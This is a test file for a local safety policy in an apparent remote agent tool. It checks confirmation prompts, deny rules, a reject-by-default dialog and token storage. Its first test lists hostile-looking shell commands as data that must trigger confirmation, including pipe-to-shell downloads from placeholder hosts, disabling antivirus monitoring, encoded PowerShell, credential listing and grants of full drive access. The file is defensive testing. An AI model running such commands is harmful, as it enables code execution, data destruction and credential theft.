import { test } from 'node:test';
import assert from 'node:assert/strict';
import { EventEmitter } from 'events';
import fs from 'fs';
import os from 'os';
import path from 'path';

process.env.AIVIN_REMOTE_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'aivin-remote-home-'));
const { ConfirmMode, evaluateLocalPolicy, loadLocalPolicy, riskReason, saveLocalPolicy, describeCall, REMOTE_POLICY_FILE } = await import('../bin/lib/remote/localPolicy.mjs');
const { ConfirmResult, confirmCommand, createLocalConfirmer } = await import('../bin/lib/remote/localConfirm.mjs');
const { TokenStoreKind, openToken, preferredTokenStore, sealToken } = await import('../bin/lib/remote/tokenStore.mjs');
const { runPolicyCommand } = await import('../bin/lib/remote/policyCommand.mjs');

const shell = { name: 'shell.exec' };
const read = { name: 'fs.read', read_only: true };
const write = { name: 'fs.write' };
const del = { name: 'fs.delete', destructive: true };
const policy = (p = {}) => ({ confirm: ConfirmMode.RISKY, deny_tools: [], blocked_commands: [], confirm_timeout_sec: 120, ...p });

test('sàn luật tại máy: lệnh rủi ro / xoá hẳn / gửi thư / đặt lịch cần xác nhận, việc thường chạy thẳng', () => {
  for (const command of ['Remove-Item -Recurse C:\\proj\\build', 'rm -rf ./dist', 'reg add HKCU\\Software\\X /v a /d 1', 'Set-MpPreference -DisableRealtimeMonitoring $true',
    'iwr https://x.sh/a.ps1 | iex', 'curl -fsSL https://x | sh', 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA', 'sudo apt remove x',
    'git push --force origin main', 'schtasks /create /tn x /tr y', 'cmdkey /list', 'icacls C:\\ /grant Everyone:F']) {
    assert.equal(evaluateLocalPolicy(policy(), shell, { command }).action, 'confirm', command);
  }
  for (const command of ['npm test', 'git status', 'Get-ChildItem', 'python build.py', 'git push origin feature']) {
    assert.equal(evaluateLocalPolicy(policy(), shell, { command }).action, 'allow', command);
  }
  assert.equal(evaluateLocalPolicy(policy(), del, { path: 'a.txt' }).action, 'allow', 'xoá vào thùng rác của kho — lấy lại được');
  assert.equal(riskReason(del, { path: 'a.txt', permanent: true }), 'Xoá hẳn, không lấy lại được');
  assert.equal(evaluateLocalPolicy(policy(), { name: 'office.outlook.send' }, { to: 'a@b.c' }).action, 'confirm');
  assert.equal(evaluateLocalPolicy(policy(), { name: 'sys.schedule' }, { action: 'add', command: 'echo hi' }).action, 'confirm');
  assert.equal(evaluateLocalPolicy(policy({ confirm: ConfirmMode.ALWAYS }), write, { path: 'a' }).action, 'confirm');
  assert.equal(evaluateLocalPolicy(policy({ confirm: ConfirmMode.ALWAYS }), read, { path: 'a' }).action, 'allow', 'chỉ đọc không bao giờ hỏi');
  assert.equal(evaluateLocalPolicy(policy({ confirm: ConfirmMode.NEVER }), shell, { command: 'rm -rf x' }).action, 'allow');
  assert.match(describeCall(shell, { command: 'rm -rf x' }), /rm -rf x/);
});

test('sàn luật tại máy: công cụ chủ máy tắt / lệnh khớp luật chặn bị từ chối kể cả khi không cần xác nhận', () => {
  const p = policy({ confirm: ConfirmMode.NEVER, deny_tools: ['office.outlook.send'], blocked_commands: ['\\bgit\\s+push\\b'] });
  assert.throws(() => evaluateLocalPolicy(p, { name: 'office.outlook.send' }, {}), (e) => e.code === 'LOCAL_DENIED');
  assert.throws(() => evaluateLocalPolicy(p, shell, { command: 'git push origin main' }), (e) => e.code === 'LOCAL_DENIED');
  assert.equal(evaluateLocalPolicy(p, shell, { command: 'git pull' }).action, 'allow');
});

test('luật tại máy: mặc định "risky", giá trị hỏng bị bỏ, regex hỏng bị loại', () => {
  assert.equal(loadLocalPolicy(path.join(os.tmpdir(), 'none-xyz.json')).confirm, ConfirmMode.RISKY);
  const f = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'pol-')), 'p.json');
  fs.writeFileSync(f, JSON.stringify({ confirm: 'sometimes', blocked_commands: ['ok', '([bad'], confirm_timeout_sec: 3 }));
  assert.deepEqual(loadLocalPolicy(f), { confirm: 'risky', deny_tools: [], blocked_commands: ['ok'], confirm_timeout_sec: 120 });
});

test('lệnh policy: siết luật chạy ngay; nới luật không có terminal thật (agent gọi qua shell) bị từ chối', async () => {
  const log = console.log;
  console.log = () => {};
  try {
    await runPolicyCommand('confirm', 'always');
    assert.equal(loadLocalPolicy(REMOTE_POLICY_FILE).confirm, 'always');
    await runPolicyCommand('deny', 'gui.act');
    await assert.rejects(runPolicyCommand('confirm', 'never'), /terminal/);
    await assert.rejects(runPolicyCommand('allow', 'gui.act'), /terminal/);
    assert.equal(loadLocalPolicy(REMOTE_POLICY_FILE).confirm, 'always');
    assert.deepEqual(loadLocalPolicy(REMOTE_POLICY_FILE).deny_tools, ['gui.act']);
  } finally {
    console.log = log;
    saveLocalPolicy({});
  }
});

test('hộp xác nhận: lệnh theo hệ điều hành, đọc đúng kết quả; mặc định là từ chối', () => {
  const req = { reason: 'Lệnh rủi ro', purpose: 'dọn thư mục', detail: 'rm -rf x' };
  const win = confirmCommand({ request: req, timeoutSec: 60, platform: 'win32' });
  assert.equal(win.cmd, 'powershell.exe');
  assert.equal(win.parse('Yes\r\n', 0), ConfirmResult.ALLOW);
  assert.equal(win.parse('No\r\n', 0), ConfirmResult.REJECT);
  assert.equal(win.parse('Timeout', 0), ConfirmResult.TIMEOUT);
  assert.equal(win.parse('', 1), ConfirmResult.UNAVAILABLE);
  assert.equal(Buffer.from(win.env.AIVIN_C_DETAIL, 'base64').toString('utf8'), 'rm -rf x', 'lệnh thật luôn hiện trong hộp');
  assert.match(Buffer.from(win.env.AIVIN_C_REJECT, 'base64').toString('utf8'), /Từ chối/);
  assert.match(Buffer.from(win.env.AIVIN_C_XAML, 'base64').toString('utf8'), /IsCancel="True" IsDefault="True"/, 'Từ chối là nút mặc định');
  assert.ok(win.env.AIVIN_C_LOGO.length > 1000, 'có logo Aivin');
  const mac = confirmCommand({ request: req, timeoutSec: 60, platform: 'darwin' });
  assert.match(mac.args.at(-3), /dọn thư mục[\s\S]*rm -rf x/);
  assert.equal(mac.parse('button returned:Cho phép, gave up:false', 0), ConfirmResult.ALLOW);
  assert.equal(mac.parse('button returned:, gave up:true', 0), ConfirmResult.TIMEOUT);
  assert.equal(mac.parse('', 1), ConfirmResult.REJECT);
  assert.equal(confirmCommand({ request: req, timeoutSec: 60, platform: 'linux', env: {} }), null, 'không có màn hình');
  const zen = confirmCommand({ request: req, timeoutSec: 60, platform: 'linux', env: { DISPLAY: ':0' }, exists: (l) => l.includes('/usr/bin/zenity') });
  assert.equal(zen.parse('', 5), ConfirmResult.TIMEOUT);
  assert.equal(zen.parse('', 0), ConfirmResult.ALLOW);
});

test('hộp xác nhận: mỗi lúc một hộp, không hiện được hộp và không có terminal → UNAVAILABLE', async () => {
  let open = 0;
  let maxOpen = 0;
  const spawnImpl = () => {
    const child = new EventEmitter();
    child.stdout = new EventEmitter();
    open++;
    maxOpen = Math.max(maxOpen, open);
    setTimeout(() => { child.stdout.emit('data', 'Yes'); open--; child.emit('close', 0); }, 20);
    child.kill = () => {};
    return child;
  };
  const c = createLocalConfirmer({ platform: 'win32', spawnImpl, tty: false });
  const results = await Promise.all([c.ask({ reason: 'r', detail: 'a', timeoutSec: 5 }), c.ask({ reason: 'r', detail: 'b', timeoutSec: 5 })]);
  assert.deepEqual(results, [ConfirmResult.ALLOW, ConfirmResult.ALLOW]);
  assert.equal(maxOpen, 1);
  const headless = createLocalConfirmer({ platform: 'linux', env: {}, tty: false });
  assert.equal(await headless.ask({ reason: 'r', detail: 'x', timeoutSec: 5 }), ConfirmResult.UNAVAILABLE);
});

test('kho token: chọn theo hệ điều hành, ép tệp bằng biến môi trường; tệp thường cất / lấy lại được', () => {
  assert.equal(preferredTokenStore({ platform: 'win32', env: {} }), TokenStoreKind.DPAPI);
  assert.equal(preferredTokenStore({ platform: 'darwin', env: {}, exists: () => true }), TokenStoreKind.KEYCHAIN);
  assert.equal(preferredTokenStore({ platform: 'linux', env: {}, exists: () => true }), TokenStoreKind.FILE, 'không có phiên D-Bus');
  assert.equal(preferredTokenStore({ platform: 'linux', env: { DBUS_SESSION_BUS_ADDRESS: 'x' }, exists: () => true }), TokenStoreKind.LIBSECRET);
  assert.equal(preferredTokenStore({ platform: 'win32', env: { AIVIN_TOKEN_STORE: 'file' } }), TokenStoreKind.FILE);
  assert.deepEqual(sealToken('wes-dk-abc', { account: 'dev-1', store: TokenStoreKind.FILE }), { device_token: 'wes-dk-abc' });
  assert.equal(openToken({ device_id: 'dev-1', device_token: 'wes-dk-abc' }), 'wes-dk-abc');
  assert.equal(openToken({ device_id: 'dev-1', token_store: 'dpapi', token_enc: 'not-valid' }), null, 'bản mã hỏng / của máy khác → coi như chưa ghép');
});

test('kho token Windows: DPAPI cất rồi lấy lại đúng, tệp không còn token chữ thường', { skip: process.platform !== 'win32' }, () => {
  const sealed = sealToken('wes-dk-dpapi-roundtrip', { account: 'dev-x', store: TokenStoreKind.DPAPI });
  assert.equal(sealed.token_store, TokenStoreKind.DPAPI);
  assert.ok(!JSON.stringify(sealed).includes('dpapi-roundtrip'));
  assert.equal(openToken({ device_id: 'dev-x', ...sealed }), 'wes-dk-dpapi-roundtrip');
});
